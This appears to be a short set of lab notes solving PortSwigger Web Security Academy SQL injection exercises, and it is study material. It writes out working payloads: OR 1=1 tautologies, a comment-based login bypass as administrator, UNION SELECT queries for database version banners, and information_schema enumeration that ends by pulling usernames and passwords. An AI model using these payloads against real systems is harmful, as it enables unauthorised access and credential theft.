# PS-academy-Labs

1. https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
     /filter?category=Clothing%2c+shoes+and+accessories%27%20OR%201%3D1%20--%20
     ' OR 1=1 -- 
2. https://portswigger.net/web-security/sql-injection/lab-login-bypass
   Solution #1
   administrator
   ' OR 1=1 --

   Solution #2
   administrator'--
  
3. https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle
   /filter?category=%27+UNION+SELECT+BANNER,NULL+FROM+v$version--
   
3. https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft
     GET /filter?category='+UNION+SELECT+@@version,+NULL# HTTP/2

5. https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
   GET /filter?category='+UNION+SELECT table_name,NULL FROM information_schema.tables-- HTTP/2
   GET /filter?category='+UNION+SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_ocqdko'-- HTTP/2
   GET /filter?category='+UNION+SELECT username_qrvfyq,password_ofzdsw FROM users_ocqdko-- HTTP/2
